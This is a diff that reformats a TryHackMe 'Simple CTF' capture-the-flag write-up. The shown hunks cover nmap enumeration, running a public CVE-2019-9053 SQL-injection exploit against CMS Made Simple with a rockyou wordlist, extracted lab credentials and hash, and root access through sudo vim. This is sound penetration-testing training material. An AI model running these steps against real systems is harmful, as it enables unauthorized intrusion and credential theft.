@@ -1,17 +1,12 @@
 TryHackMe: Simple CTF — Write-Up
-
 1. Reconnaissance & Scanning
 
 We begin by scanning the target IP for open ports and running services using nmap:
 
 nmap -sC -sV -oN nmap.scan <TARGET_IP>
-
 Scan Output Analysis
-
 Port 21 (FTP): Running vsftpd 3.0.3 with anonymous login allowed.
-
 Port 80 (HTTP): Running Apache httpd 2.4.18.
-
 Port 2222 (SSH): Running OpenSSH 7.2p2 on a non-standard port.
 
 Q1: How many services are running under port 1000?
@@ -58,32 +53,13 @@ searchsploit -m php/webapps/46635.py
 We then run the exploit against the target URL with the --crack option using rockyou.txt:
 
 python3 46635.py -u http://<TARGET_IP>/simple --crack -w /usr/share/wordlists/rockyou.txt
-
 Exfiltrated Data
-
-Field
-
-Value
-
-Username
-
-mitch
-
-Email
-
-admin@admin.com
-
-Salt
-
-1dac0d92e9fa6bb2
-
-MD5 Hash
-
-0c01f4468bd75d7a84c7eb73846e8d96
-
-Cracked Password
-
-secret
+Field	Value
+Username	mitch
+Email	admin@admin.com
+Salt	1dac0d92e9fa6bb2
+MD5 Hash	0c01f4468bd75d7a84c7eb73846e8d96
+Cracked Password	secret
 
 Q5: What's the password?
 Answer: secret
@@ -120,9 +96,7 @@ Answer: sunshine
 We check for sudo privileges assigned to mitch:
 
 sudo -l
-
 Output
-
 User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
 
@@ -156,46 +130,13 @@ Summary
 
 The attack path was:
 
-Nmap
-  ↓
-Discover FTP / HTTP / SSH
-  ↓
-Gobuster
-  ↓
-Discover /simple/
-  ↓
-Identify CMS Made Simple 2.2.8
-  ↓
-CVE-2019-9053 — SQL Injection
-  ↓
-Extract credentials
-  ↓
-Crack password
-  ↓
-SSH as mitch
-  ↓
-User flag
-  ↓
-sudo -l
-  ↓
-Vim as root
-  ↓
-Root shell
-  ↓
-Root flag
+Nmap → Gobuster → CMS Made Simple 2.2.8 → CVE-2019-9053 (SQLi) → Credential Extraction → Password Cracking → SSH → User Flag → sudo -l → Vim → Root Shell → Root Flag
 
 Key Takeaways
-
 Always begin with enumeration.
-
 Check all discovered services and non-standard ports.
-
 Identify the technology and version running on web applications.
-
 Use searchsploit to look for known vulnerabilities.
-
 After obtaining credentials, test where they can be reused.
-
 Always run sudo -l when you obtain a shell.
-
 Check whether allowed binaries can be leveraged for privilege escalation.
